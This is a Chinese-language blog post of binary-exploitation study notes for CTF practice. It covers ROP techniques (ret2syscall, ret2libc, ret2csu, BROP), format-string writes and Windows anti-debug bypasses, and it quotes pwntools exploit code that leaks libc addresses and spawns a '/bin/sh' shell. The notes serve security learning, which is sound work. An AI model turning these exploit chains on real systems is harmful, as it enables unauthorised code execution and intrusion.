---
title: 365 Days Xuanwu Job Note
date: 2026-08-11 15:33:37
categories:
- dev
- cybersecurity
---

来源: 知名开源项目https://github.com/Vancir/365-days-get-xuanwulab-job

对内容进行了一些更新，以及部分比较基础的内容去除/合并了。以下是学习笔记

### Day 1
这两日的主要内容是经典的stackoverflow加上ROP exploit. 主要使用的工具是pwntools, pwndbg, ghidra
首先是复习一些x86的汇编

`call`等价于
* push the address of the next instruction (return address)
* jump to the function

cdecl calling convention: 由caller来修改esp(即清除stack上的arguments)

`leave`即离开当前stack frame，约等于把ebp和esp归位
`ret` pop出return address然后jump回去
`dword ptr`: double word pointer
`dword ptr [esp], eax`: 将esp视作指向32bit value的pointer，将eax的值写入其中

工具和小技巧:
* `pwndbg`中可以设置`layout pwndbg`，类似于gdb自己的tui，可以可视化地看assembly, stack之类的。ctrl+x a关闭/开启
* `pwndbg`可以用`tele`查看stack上的状况
* `strings`查看executable中的ascii字符串，用`-n`指定最短长度，比如5

ROP(return oriented programming)是一种利用程序中已有的一些gadgets来改变某些register/变量的值，进而达到控制整个control flow的目的的攻击方式

接下来讲解[basic ROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/)中的几个案例。

**ret2text**: 首先用`checksec`看到没有PIE。然后直接启动pwndbg在main打上bp。用`strings`查找字符串发现有`/bin/sh`，然后在pwndbg中search找到对应的位置。
我们会发现有个隐藏的`secure`函数(可以通过ghidra/IDA也可以通过直接查看symbols来确认)
然后我们查看ebp和buffer的地址，然后算出偏移，就可以直接构造payload了。需要overwrite的值就是`buffer - ebp + 4`，`ebp`指向的地方存的是旧的ebp，在他上面则是存的return address
也可以直接用`pwn cyclic`生成cyclic 串然后输入，再直接看ebp的地方存了什么，然后用`pwn cyclic -l`查看就行。

**ret2shellcode**: 基本上一样，区别在于目标buffer从stack移动到了bss。然后我们需要自己构造shellcode填入buffer然后执行。

**ret2syscall**: 这个更加复杂一些。首先找到return address的offset是112。然后我们的目标是利用gadgets来执行`execve("/bin/sh", NULL, NULL)`来获得shell。

我们需要构造的stack长这样
```text
lower addresses
+-----------------------------+
| 0x080bb196                  | <- pop eax ; ret
+-----------------------------+
| 0x0000000b                  | <- value for EAX // pop eax会吃掉这个
+-----------------------------+
| 0x0806eb90                  | <- pop edx ; pop ecx ; pop ebx ; ret
+-----------------------------+
| 0x00000000                  | <- value for EDX
+-----------------------------+
| 0x00000000                  | <- value for ECX
+-----------------------------+
| 0x080be408                  | <- value for EBX: address of "/bin/sh"
+-----------------------------+
| 0x08049421                  | <- int 0x80 // trigger syscall的interrupt
+-----------------------------+
higher addresses
```

基本原理就是，`ret`会从stack上pop出下一个instruction的地址，所以可以通过这种方式chain起来
我们需要用`ROPgadget`寻找这些gadget的地址，然后再构造payload

**ret2libc**: 
plt: Procedure Linkage Table
在执行libc函数，比如`puts`的时候，会出现`call puts@plt`，其中`.plt`中的`puts`不是真正的代码，而是一个跳板，帮助找到libc中真正`puts`的位置。
got: Global Offset Table
地址表，在第一次call的时候got中还没有libc函数的真正地址，因此plt会直接跑到`plt0`然后把控制权交给linker的resolver。最终会计算出`puts = libc_base + puts_offset`，而后写会got (即lazy binding，要用的时候再bind)。

因此，只需要把got中某个libc函数的address print出来，我们就可以知道offset，进而可以把control flow导向libc中的gadgets
如果PIE关闭，那么程序本身的`puts@plt`和`puts@got`是知道的。构造rop chain: 
```
pop rdi ; ret
puts@got  // elf.got["puts"]
puts@plt
main
```
然后再从print出的信息，计算offset从而构造新的payload执行attack。
如果开启了PIE，则main program自己也会被随机化base address，在这种情况下需要先想办法获取main program中某些的address，然后获得base，再加上`puts@plt`和`puts@got`的offset

这个就对应ret2libc的example 3的操作

### Day 2
**ret2csu**: 理念上和basic rop是一样的，但是用的gadget不一样，因此会更复杂一点。
这里利用的是`__libc_csu_init`中的gadgets。两个gadget分别是
```text
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
...
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
```
第一部分从r13-r15中获取rdx, rsi, edi然后调用`r12`指向的函数(`r12`应该储存一个指向函数的指针，而不是直接储存函数地址)
写入`edi`只会写入low32b，而high32b会被清空，但在这里问题不大。
第二部分从stack上pop出如上的这些registers的值。
然后直接看ctfwiki上的exploit:
```py
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = b'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    time.sleep(1)

# 实际上应该写成
def csu_call(rbx=0, rbp=1, pointer_to_func, arg3, arg2, arg1, back_to)
```
几个点:
* 先进入第二个gadget，控制register的值，然后return到第一个gadget
* `'a' * 0x38`是因为我们不会执行`jnz`，而是在第一个gadget执行完回到第二个gadget，执行`add rsp,8`开始的instructions，因此我们需要pad `8+8*6=56=0x38`个bytes。最后再回到`last`指定的位置



然后我们来看几个csu的call
```py
sh.recvuntil(b'Hello, World\n')
csu(0, 1, write_got, 8, write_got, 1, main_addr)
```
等价于`write(1, write_got, 8)`，即向`stdout`(1) 写入`8` bytes的值，值为`write_got`(即`write`在got中储存的地址)
当然最终需要回到`main`来进行下一步exploit

```py
write_addr = u64(sh.recv(8))
log.info(f"Leaked write address: {hex(write_addr)}")

libc_base = write_addr - libc.symbols['write']
log.success(f"Libc base address: {hex(libc_base)}")

execve_addr = libc_base + libc.symbols['execve']
log.success(f"Execve address: {hex(execve_addr)}")
# 上面的计算获取offset和execve的地址

sh.recvuntil(b'Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')
```
上面这个call相当于`read(0, bss_base, 16)`，即从`stdin`(0)读取`16` bytes到`bss_base`。
而后写入地址，8byte的`execve_addr`和8byte的`"/bin/sh\0"`
这是因为`r12`需要一个pointer to function，因此我们必须先找个地方存下这个pointer

```py
sh.recvuntil(b'Hello, World\n')
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```
这个就简单了，相当于`*bss_base("/bin/sh", 0, 0)`，即`execve("/bin/sh", 0, 0)`。

文中还介绍了一个技巧: CPU的instruction decode并不会管哪里是boundary
假设我们有一条instruction
```asm
41 5d    pop r13
```
如果从当中开始decode，那么
```asm
5d       pop rbp
```
也就是加了这个`41` 相当于给register的index加了8。
更重要的是x86的instruction本身是variable length的，也就是说一个instruction从当中切开，前面是prefix而后面还是一个完整的instruction。而cpu会直接执行这个完整的instruction，不会再往后面读。所以，后续的指令并不会被我们这个从中间切开的地址影响。

**BROP** Blind ROP
攻击条件是有stackoverflow，并且服务器crash后重启地址不变，即ASLR只有最初启动时有用。
首先暴力枚举溢出长度直到程序crash。按照byte一个个进行爆破，64b最多需要$2^8\times 8 = 2048$次
这个exploit比较复杂

然后需要寻找能用的gadgets。
* stop gadgets，即程序进入这个状态后会无限循环而不会crash。这样attacker才能知道自己猜到了对的gadget
* trap gadgets, 进入后程序立刻crash的gadget.
* brop gadgets, 能控制传参的gadget，典型例子为csu尾部的rop chain

在stack上摆放stop/trap gadgets，不断probe。通过程序是否crash来找出不会pop stack的gadget; 只pop一个variable的gadget; ...
如果probe本身是个stop gadgets，只要后面都是trap gadgets就可以发现。

寻找plt：plt表结构规整，大部分plt调用都不太会crash。如果发现连续的16B对齐地址都没crash，+6后也不crash，那么就要怀疑是否碰到了plt
然后需要确认plt中的`strcmp`(或其他类似函数)，用来控制rdx，而后寻找`write`或者`puts`之类的输出函数(write需要3个参数，因此需要`strcmp`或其他函数来控制rdx)。`strcmp`只有在两个参数都不是bad address的时候才会执行，这个性质可以用来确定哪个表项是`strcmp`

后面的例子比较复杂，之后可以重新review一下

**Format String Vulnerability**: 这个比较简单。如果用户可以控制format string，那么首先可以用大量`%s`来让程序crash，也可以直接dump stack上的内容，甚至可以用`%n`进行任意写。

总体思想就是padding+address+写入。比如
`[addr]%012d%6$n`
先写address，然后需要知道我们的format string在stack上的位置，这里是第6个format arg，所以我们用`%6$n`来把值写入第六个argument代表的pointer(即`addr`)，然后用`%012d`进行padding，把值pad到16，或者其他我们希望写入的值。
另外address不一定需要放在最前面。比如我们希望写入`2`，那也可以直接`aa%8$n[addr]`之类的(`8`是随便写的数字)
对于写入大数字，我们倾向于用`%hhn`(单byte)和`%hn`(双byte)

在例子一节里介绍的攻击：
* hijack GOT，直接把puts之类的函数的got项修改为system或其他危险函数的地址，在下次执行puts时就会直接执行system
* hijact return address，获得offset，然后直接修改return address到想要的地方
* 堆上字符串，将栈迁移上堆(stack pivoting)。这个比较麻烦，需要寻找很多地址。因为format string在heap上也就意味着往stack上一直读并不会读到format string自身，也就没办法直接在format string里面注入一个address。但是在这个example里，saved ebp本身会被当作format argument读到。但因为我们只能直接往saved ebp写，也就意味着我们不能用`hhn`之类的手段，只能一次写完，这可能导致exploit失败

### Day 3
**Windows Anti-debug**:
主要参考[这篇](https://ctf-wiki.org/reverse/platform/windows/anti-debug/example/)
* `IsDebuggerPresent`: 单纯检测`BeingDebugged` flag的值，直接手动设置一下或者手动改返回值就可以绕过。
* `NtGlobalFlag`: PEB中的一个字段，有一些flag。只有进程由debugger创建(而非attach)时才会被设置。绕过检测也很简单，用一些插件，`windbg -hd`禁用调试堆，也可以直接手动修改flag的值。
* `Interrupt 3`: `EXCEPTION_BREAKPOINT(0x80000003)`触发时，`EIP`不会像其他异常处理时一样被指向异常的下一句指令。
* `CheckRemoteDebuggerPresent`: remote指的是同一台机器的不同进程，检测指定进程是否在被debug。通过`NtQueryInformationProcess`来完成。可以直接修改值或者jump flag来绕过。
* `NtQueryInformationProcess()`: 有几个信息类。`ProcessDebugPort`来自内核，很难直接绕过。通过读取`EPROCESS`的`DebugPort`来判断。还有一些其他的信息类
* `ZwSetInformationThread()`: 通过传入特定参数来禁止thread产生调试事件。绕过只需要修改传入函数的参数。
* 时间差检测: 获取调试和非调试下的时间差异来判断

**VM检测**:
* BIOS
* 字符串特征
* VMWare IO Port

其他的保护策略:
数据校验: 计算好checksum运行时比较是否被修改
内存校验: 类似，检测一些不应该被修改的segment是否被修改
Shadow Stack: 在存return address时在另一个栈上(shadow stack)也存一份，返回前检查两个地址是否相等。这能有效阻止ROP
Windows CFG (Control Flow Guard): 在security的课程中学到过。简单来说就是分析正常来说当前函数可能会jump到哪些函数。如果jump到不应该去的函数，那就说明control flow被劫持了，比如有人利用了stackoverflow，然后试图return回一些危险的函数来获得控制权。
Virtualization Obfuscation: 自己定义一套VM，寄存器，stack，opcode，把原始代码翻译成自己的bytecode再执行。
保护壳: 用来保护软件不被非法修改或反编译的技术。先于程序运行，拿到控制权，完成保护软件的任务。有压缩壳，即运行时再解压，和加密壳，即运行时再解密。但壳本身也是一个正常程序，仍然可以被debug。可以通过一些debug手段来停在OEP(original entry point)之前，把真正的程序dump出来。
IAT(Import Address Table) Obfuscation: 导入表加密，防止attacker通过IAT获得太多symbol信息，把API的语义隐藏。具体来说，可以用API hashing，即算hash来找到匹配的api，让api只以一串hash的形式出现。IAT模拟: 自己实现一些可能调用的外部函数
模块拷贝移位: 用来对抗hook。重新读一份dll，然后加载。在原来的dll上设置的hook就被绕开了。
代码混淆(obfuscation): 用一些策略来干扰静态分析工具，包括
* String Encryption: 避免暴露裸的string text
* Dynamic code loading / packing: 在运行时load一些代码而不是直接全部打包
* Control Flow Obfuscation: 即加入一些垃圾让程序的control flow变得乱七八糟，难以分析。
* Dead Code Injection: 注入垃圾代码让reverse engineering时需要分析的东西变多
* Symbol Stripping: rename一些本来比较固定的symbols
* Control Flow Flattening: 用dispatcher/state machine代替原本的control flow
* Junk Code: 增加垃圾，干扰静态分析
